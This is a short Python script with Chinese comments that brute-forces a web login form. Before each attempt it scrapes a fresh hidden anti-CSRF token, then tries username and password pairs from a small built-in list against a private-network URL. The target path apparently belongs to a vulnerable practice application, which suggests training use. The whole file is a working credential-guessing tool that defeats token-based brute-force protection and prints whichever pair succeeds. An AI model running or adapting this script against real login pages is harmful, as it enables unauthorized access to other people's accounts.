import requests
import re

def get_token():
    #用正则表达式获取token
    url = "http://192.168.242.86/vul/burteforce/bf_token.php"
    res = session.get(url)
    tokens = re.search(r'<input\s+type="hidden"\s+name="token"\s+value="(.*)"\s*/?>' ,res.text)
    if tokens:
        token = tokens.group(1)
    else:
        token = None
    return token

if __name__ == "__main__":
    #自己构造密码字典
    usernames = ["admin","123456","login"]
    passwords = ["admin","123456","login"]
    TryLenth = len(usernames) * len(passwords)
    print(f"准备尝试开始爆破，尝试次数{TryLenth}")

    # 将起始尝试次数置1
    TryNum = 1

    TargetUrl = "http://192.168.242.86/vul/burteforce/bf_token.php"
    #会话对象，保持cookie
    session = requests.Session()
    
    for user in usernames:
        for passwd in passwords:

            #获取token
            token = get_token()

            #构造数据
            data = {"username":user,
                    "password":passwd,
                    "token":token,
                    "submit":"Login"
                    }

            # 获取响应页面
            res = session.post(url=TargetUrl, data=data)

            print(f"第{TryNum}次尝试:")
            if ("login success" in res.text):
                print(f"爆破成功\n账号:{user}\n密码:{passwd}\ntoken:{token}\n")
            else:
                print(f"爆破失败\n账号:{user}\n密码:{passwd}\ntoken:{token}\n")

            TryNum = TryNum + 1

